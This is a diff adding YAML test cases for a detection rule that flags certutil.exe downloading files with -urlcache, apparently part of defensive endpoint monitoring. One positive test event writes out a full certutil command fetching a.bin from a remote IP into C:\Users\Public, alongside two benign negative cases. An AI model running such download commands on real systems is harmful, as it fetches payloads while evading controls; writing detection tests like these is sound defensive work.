@@ -1,0 +1,18 @@
+tests:
+  - name: detects certutil used to download with urlcache
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.10/a.bin C:\Users\Public\a.bin'
+    expected: true
+
+  - name: ignores certutil dumping a certificate file
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -dump C:\certs\corp-root.cer'
+    expected: false
+
+  - name: ignores urlcache text passed to a different binary
+    event:
+      Image: 'C:\Windows\System32\notepad.exe'
+      CommandLine: 'notepad.exe urlcache-notes.txt'
+    expected: false
